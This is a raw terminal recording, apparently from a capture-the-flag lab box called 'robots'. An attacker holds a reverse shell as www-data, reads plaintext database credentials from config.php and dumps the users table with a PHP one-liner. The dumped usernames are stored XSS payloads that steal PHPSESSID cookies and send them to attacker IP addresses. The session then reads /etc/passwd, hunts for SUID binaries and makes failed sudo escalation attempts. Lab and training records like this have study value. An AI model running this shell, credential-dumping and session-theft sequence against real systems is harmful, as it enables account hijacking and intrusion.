@@ -1,0 +1,225 @@
+Script started on 2025-03-15 14:31:01+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 7885
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+admin.php
+config.php
+css
+index.php
+login.php
+logout.php
+register.php
+server_info.php
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ cat config.php[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat config.php
+[Kcat config.php[Kcat config.php[Kcat config.php
+<?php
+    $servername = "db";
+    $username = "robots";
+    $password = "q4qCz1OflKvKwK4S";
+    $dbname = "web";
+// Get the current hostname
+$currentHostname = $_SERVER['HTTP_HOST'];
+
+// Define the desired hostname
+$desiredHostname = 'robots.thm';
+
+// Check if the current hostname does not match the desired hostname
+if ($currentHostname !== $desiredHostname) {
+    // Redirect to the desired hostname
+    header("Location: http://$desiredHostname" . $_SERVER['REQUEST_URI']);
+    exit();
+}
+ini_set('session.cookie_httponly', 1);
+
+session_start();
+
+?>
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ cat [K[K[K[K[7mphp -r '$conn=new PDO("mysql:host=db;dbname=web","robots","q[27m[7m4[27m[7mqCz1OflKvKwK4S");foreach($conn->query("SELECT * FROM users") as $row)print_r($row);'[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hphp -r '$conn=new PDO("mysql:host=db;dbname=web","robots","q4qCz1OflKvKwK4S");foreach($conn->query("SELECT * FROM users") as $row)print_r($row);'
+[K<uery("SELECT * FROM users") as $row)print_r($row);'[K<uery("SELECT * FROM users") as $row)print_r($row);'[K<uery("SELECT * FROM users") as $row)print_r($row);'
+[KArray
+(
+    [id] => 1
+    [0] => 1
+    [username] => admin
+    [1] => admin
+    [password] => 3e3d6c2d540d49b1a11cf74ac5a37233
+    [2] => 3e3d6c2d540d49b1a11cf74ac5a37233
+    [group] => admin
+    [3] => admin
+)
+[KArray
+(
+    [id] => 2
+    [0] => 2
+    [username] => rgiskard
+    [1] => rgiskard
+    [password] => dfb35334bf2a1338fa40e5fbb4ae4753
+    [2] => dfb35334bf2a1338fa40e5fbb4ae4753
+    [group] => nologin
+    [3] => nologin
+)
+Array
+(
+    [id] => 3
+    [0] => 3
+    [username] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("http://10.17.9.139:8081/logger?phpsessid="+encodeURIComponent(m[1]))});</script>
+    [1] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("http://10.17.9.139:8081/logger?phpsessid="+encodeURIComponent(m[1]))});</script>
+    [password] => 3543193ce77bb658bba4c042be4a8d77
+    [2] => 3543193ce77bb658bba4c042be4a8d77
+    [group] => guest
+    [3] => guest
+)
+Array
+(
+    [id] => 4
+    [0] => 4
+    [username] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("htt45/logger?phpsessid="+encodeURIComponent(m[1]))p://10.8.61.2});</script>
+    [1] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("htt45/logger?phpsessid="+encodeURIComponent(m[1]))p://10.8.61.2});</script>
+    [password] => 62ce2cfa67fec9458b4284e8c37379ee
+    [2] => 62ce2cfa67fec9458b4284e8c37379ee
+    [group] => guest
+    [3] => guest
+)
+Array
+(
+    [id] => 5
+    [0] => 5
+    [username] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("http://10.8.61.245/logger?phpsessid="+encodeURIComponent(m[1]))});</script>
+    [1] => <script>fetch("http://robots.thm/harm/to/self/server_info.php",{credentials:"include"}).then(r=>r.text()).then(d=>{let m=d.match(/PHPSESSID=([\w\d]+)/);if(m)fetch("http://10.8.61.245/logger?phpsessid="+encodeURIComponent(m[1]))});</script>
+    [password] => d87e6dfb06d452f5ab017f87931baca5
+    [2] => d87e6dfb06d452f5ab017f87931baca5
+    [group] => guest
+    [3] => guest
+)
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ php -r '$conn=new PDO("mysql:host=db;dbname=web","robots","q4qCz1OflKvKwK4S");foreach($conn->query("SELECT * FROM users") as $row)print_r($row);'[A[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwhich python[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich python
+[Kwhich python[Kwhich python[Kwhich python
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ cat /etc/passwd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/passwd
+[Kcat /etc/passwd[Kcat /etc/passwd[Kcat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+www-data@robots:/var/www/html/harm/to/self$ [Kwww-data@robots:/var/www/html/harm/to/self$ [K[?2004hwww-data@robots:/var/www/html/harm/to/self$ cd /[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /
+[Kcd /[Kcd /[Kcd /
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 68
+drwxr-xr-x   1 root root 4096 Aug 19  2024 .
+drwxr-xr-x   1 root root 4096 Aug 19  2024 ..
+-rwxr-xr-x   1 root root    0 Aug 19  2024 .dockerenv
+lrwxrwxrwx   1 root root    7 Aug 12  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Mar 29  2024 boot
+drwxr-xr-x   5 root root  340 Mar 15 10:44 dev
+drwxr-xr-x   1 root root 4096 Aug 19  2024 etc
+drwxr-xr-x   2 root root 4096 Mar 29  2024 home
+lrwxrwxrwx   1 root root    7 Aug 12  2024 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Aug 12  2024 lib64 -> usr/lib64
+drwxr-xr-x   2 root root 4096 Aug 12  2024 media
+drwxr-xr-x   2 root root 4096 Aug 12  2024 mnt
+drwxr-xr-x   2 root root 4096 Aug 12  2024 opt
+dr-xr-xr-x 190 root root    0 Mar 15 10:44 proc
+drwx------   1 root root 4096 Aug 13  2024 root
+drwxr-xr-x   1 root root 4096 Aug 13  2024 run
+lrwxrwxrwx   1 root root    8 Aug 12  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Aug 12  2024 srv
+dr-xr-xr-x  13 root root    0 Mar 15 10:44 sys
+drwxrwxrwt   1 root root 4096 Mar 15 11:12 tmp
+drwxr-xr-x   1 root root 4096 Aug 12  2024 usr
+drwxr-xr-x   1 root root 4096 Aug 13  2024 var
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ cd opt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd opt
+[Kcd opt[Kcd opt[Kcd opt
+www-data@robots:/opt$ [Kwww-data@robots:/opt$ [K[?2004hwww-data@robots:/opt$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+www-data@robots:/opt$ [Kwww-data@robots:/opt$ [K[?2004hwww-data@robots:/opt$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ cd [K[K[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 68
+drwxr-xr-x   1 root root 4096 Aug 19  2024 .
+drwxr-xr-x   1 root root 4096 Aug 19  2024 ..
+-rwxr-xr-x   1 root root    0 Aug 19  2024 .dockerenv
+lrwxrwxrwx   1 root root    7 Aug 12  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Mar 29  2024 boot
+drwxr-xr-x   5 root root  340 Mar 15 10:44 dev
+drwxr-xr-x   1 root root 4096 Aug 19  2024 etc
+drwxr-xr-x   2 root root 4096 Mar 29  2024 home
+lrwxrwxrwx   1 root root    7 Aug 12  2024 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Aug 12  2024 lib64 -> usr/lib64
+drwxr-xr-x   2 root root 4096 Aug 12  2024 media
+drwxr-xr-x   2 root root 4096 Aug 12  2024 mnt
+drwxr-xr-x   2 root root 4096 Aug 12  2024 opt
+dr-xr-xr-x 190 root root    0 Mar 15 10:44 proc
+drwx------   1 root root 4096 Aug 13  2024 root
+drwxr-xr-x   1 root root 4096 Aug 13  2024 run
+lrwxrwxrwx   1 root root    8 Aug 12  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Aug 12  2024 srv
+dr-xr-xr-x  13 root root    0 Mar 15 10:44 sys
+drwxrwxrwt   1 root root 4096 Mar 15 11:12 tmp
+drwxr-xr-x   1 root root 4096 Aug 12  2024 usr
+drwxr-xr-x   1 root root 4096 Aug 13  2024 var
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ [7mfind / -user root -perm /4000 2>/dev/null[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000 2>/dev/null
+[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null
+[K/usr/bin/umount
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/su
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ [7msudo mount -o bind /bin/sh /bin/mount[27m
+[7msudo mount[27m[A[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hsudo mount -o bind /bin/sh /bin/mount
+sudo mount
+[Ksudo mount -o bind /bin/sh /bin/mount[Ksudo mount -o bind /bin/sh /bin/mount[Ksudo mount -o bind /bin/sh /bin/mount
+bash: sudo: command not found
+www-data@robots:/$ [Kwww-data@robots:/$ [Kwww-data@robots:/$ sudo mount
+bash: sudo: command not found
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ sudo su[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo su
+[Ksudo su[Ksudo su[Ksudo su
+bash: sudo: command not found
+www-data@robots:/$ [Kwww-data@robots:/$ [K[?2004hwww-data@robots:/$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-03-15 17:01:01+03:00 [COMMAND_EXIT_CODE="0"]
